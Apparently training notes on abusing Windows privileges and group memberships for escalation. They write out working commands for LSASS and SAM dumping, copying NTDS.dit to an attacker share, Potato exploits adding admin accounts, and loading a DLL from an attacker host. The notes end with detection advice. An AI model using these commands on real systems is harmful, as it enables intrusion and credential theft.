## Windows Privileges Overview

Windows privileges are rights attached to an account's access token that control what system-level operations that account can perform. They are distinct from file/object permissions and are evaluated by the kernel on every privileged operation attempt. Disabled privileges are still assigned to the token and can often be enabled through scripting, meaning they are still abusable. 

***

## The Authorization Flow

When a user or process attempts to access a securable object, Windows compares the caller's access token against the object's security descriptor. The token contains:

- User SID
- Group SIDs (all groups the user is a member of)
- Privilege list (enabled and disabled)
- Integrity level (Untrusted, Low, Medium, High, System)

The security descriptor contains a Discretionary Access Control List (DACL) made up of Access Control Entries (ACEs) that either allow or deny specific rights to specific SIDs. The result is a binary grant or deny decision. 

***

## Enumerating Privileges

```cmd
:: Current user and full token information (most important command)
whoami /all

:: Privileges only
whoami /priv

:: Groups only
whoami /groups

:: Elevated vs non-elevated comparison
:: Standard user sees 2 privileges (SeChangeNotifyPrivilege, SeIncreaseWorkingSetPrivilege)
:: Local admin in non-elevated session sees a similarly stripped token
:: Local admin in elevated session sees 20+ privileges
```

A privilege listed as `Disabled` is still assigned. The token has it, but it requires activation before use. Windows provides no built-in cmdlet to enable privileges, so a script or compiled tool is needed: 

```powershell
# Enable a disabled privilege using PoshPrivilege module
Import-Module .\Enable-Privilege.ps1
Enable-Privilege SeBackupPrivilege

# Or using the Lee Holmes PowerShell script
. .\Adjust-TokenPrivilege.ps1
Adjust-Privilege SeBackupPrivilege
```

***

## High-Value Privileges

### SeImpersonatePrivilege

Granted by default to all service accounts. Allows a process to impersonate the security context of a connecting client after authentication. Used by every Potato attack variant. 

```cmd
:: Confirm presence
whoami /priv | findstr "SeImpersonatePrivilege"

:: Exploit path depends on OS version:
:: Server 2016 and below / Win 10 before 1809:
.\JuicyPotato.exe -l 1337 -p cmd.exe -a "/c net user hacker Pass1! /add" -t *

:: Server 2019+ / Win 10 1809+:
.\PrintSpoofer.exe -i -c cmd.exe
.\RoguePotato.exe -r 10.10.14.2 -e "whoami" -l 9999
.\GodPotato.exe -cmd "cmd /c whoami"
```

### SeBackupPrivilege

Bypasses all file and registry ACL checks for read operations. Grants read access to any file on the system including SAM, SYSTEM, SECURITY hives, and NTDS.dit regardless of permissions. 
```cmd
:: Confirm
whoami /priv | findstr "SeBackupPrivilege"

:: Method 1: reg save to dump SAM and SYSTEM hives
reg save HKLM\SAM C:\Windows\Temp\sam.hive
reg save HKLM\SYSTEM C:\Windows\Temp\system.hive
reg save HKLM\SECURITY C:\Windows\Temp\security.hive

:: Transfer to attack machine and extract hashes
secretsdump.py -sam sam.hive -system system.hive -security security.hive LOCAL

:: Method 2: On a DC, use wbadmin to backup NTDS.dit
wbadmin start backup -backuptarget:\\<attacker_ip>\share -include:C:\Windows\NTDS\NTDS.dit
```

### SeRestorePrivilege

Bypasses all file and registry ACL checks for write operations. Can overwrite any system file, replace service binaries, or modify registry keys regardless of permissions. 

```cmd
:: Can overwrite any file, including SYSTEM binaries
:: Example: replace utilman.exe with cmd.exe for sticky keys bypass
cmd /c copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe

:: Can modify any registry key including service ImagePath
reg add "HKLM\SYSTEM\CurrentControlSet\Services\<service>" /v ImagePath /t REG_EXPAND_SZ /d "cmd /c net user hacker Pass1! /add"
```

### SeDebugPrivilege

Allows a process to open a handle to any other process or thread, bypassing all security descriptor checks. Used to read LSASS memory for credential extraction. 

```cmd
:: Confirm
whoami /priv | findstr "SeDebugPrivilege"

:: If enabled as admin, dump LSASS memory
:: Task Manager -> Details -> lsass.exe -> Right-click -> Create dump file

:: Programmatic approach with procdump (Sysinternals)
procdump.exe -accepteula -ma lsass.exe lsass.dmp

:: Read dump offline with Mimikatz
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

### SeLoadDriverPrivilege

Allows loading and unloading of kernel device drivers. A kernel driver runs at Ring 0 and can perform any operation, making this privilege equivalent to full SYSTEM access. 

```cmd
:: Confirm
whoami /priv | findstr "SeLoadDriverPrivilege"

:: Exploit: Load a vulnerable signed driver, then exploit it
:: Example: Capcom.sys driver exploit
:: 1. Create a malicious registry key pointing to the driver
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1

:: 2. Load driver using NtLoadDriver via exploit tool
.\ExploitCapcom.exe
```

### SeTakeOwnershipPrivilege

Allows taking ownership of any securable object (files, registry keys, services, AD objects) without needing existing permissions. After taking ownership, you can then modify the DACL to grant yourself full access. 

```cmd
:: Take ownership of a file
takeown /f C:\Windows\System32\Utilman.exe

:: Grant yourself full control after taking ownership
icacls C:\Windows\System32\Utilman.exe /grant %USERNAME%:F

:: Now replace the file or modify as needed
```

### SeTcbPrivilege

Allows a process to assume the identity of any user. Rarer than SeImpersonatePrivilege but broader in scope since it does not require the target user to connect first. Typically only assigned to antivirus and backup products. 

***

## Dangerous Group Memberships

Group membership translates directly into privilege assignment. Finding a user in any of these groups is often an immediate escalation path: 
| Group | Why It Is Dangerous |
|---|---|
| **Backup Operators** | SeBackupPrivilege + SeRestorePrivilege + local logon to DCs = full domain compromise   |
| **Server Operators** | Can modify service binaries on DCs, access SMB shares, backup files |
| **Print Operators** | SeLoadDriverPrivilege + local DC logon = kernel driver load = SYSTEM |
| **Account Operators** | Can modify most AD user/group objects, add users to privileged groups |
| **Hyper-V Administrators** | Full control over virtual DCs = effective Domain Admin |
| **DNS Admins** | Can load a malicious DLL into the DNS service running on DCs |
| **Schema Admins** | Can modify AD schema, backdoor default object ACLs |
| **Remote Management Users** | WinRM access to DCs and servers |
| **DnsAdmins** | `dnscmd /config /serverlevelplugindll \\<attacker>\share\evil.dll` |

### Server Operator Group - Quick Exploitation Path

```cmd
:: List services
services

:: Change a service binary path to your command
sc config VMTools binPath= "cmd /c net user hacker Pass1! /add && net localgroup Administrators hacker /add"

:: Start the service (runs as SYSTEM)
sc start VMTools
:: Service will fail to start but the command runs before it fails
```

### Backup Operators - DC Credential Dump Path

```cmd
:: Step 1: Enable SeBackupPrivilege if disabled
:: (requires SeBackupPrivilege script from earlier)

:: Step 2: Mount a shadow copy of C: to access NTDS.dit
diskshadow /s shadow.txt
:: shadow.txt contents:
:: set context persistent nowriters
:: add volume c: alias someAlias
:: create
:: expose %someAlias% z:

:: Step 3: Copy NTDS.dit using backup semantics
robocopy /b z:\Windows\NTDS\ C:\Windows\Temp\ ntds.dit

:: Step 4: Dump SAM and SYSTEM hives
reg save HKLM\SYSTEM C:\Windows\Temp\system.hive

:: Step 5: Extract all hashes offline
secretsdump.py -ntds ntds.dit -system system.hive LOCAL
```

***

## UAC and Disabled Privileges

UAC splits the administrator token into two: a standard token used for most operations and a full admin token activated only when elevated. This is why `whoami /priv` in a non-elevated admin shell shows a stripped token. 

```cmd
:: Elevated session (run as administrator):
:: Shows ~24 privileges including SeDebugPrivilege, SeBackupPrivilege, etc.

:: Non-elevated session (even as local admin):
:: Shows only 2-3 standard user privileges
:: The admin privileges exist but are in the filtered token

:: UAC bypass is required to activate the full token without prompting
:: Covered in the UAC bypass section of this module
```

***

## Detection Reference

Windows Event ID `4672` fires every time an account with sensitive privileges assigned logs on. It lists all privileges in the new session and is the primary detection signal for privilege abuse: 

```
Event ID 4672: Special privileges assigned to new logon
  Subject: <account name>
  Privileges:
    SeDebugPrivilege
    SeBackupPrivilege
    SeImpersonatePrivilege
    ...
```

Defenders should alert on `4672` events where sensitive privileges appear on non-standard accounts, especially on Domain Controllers.
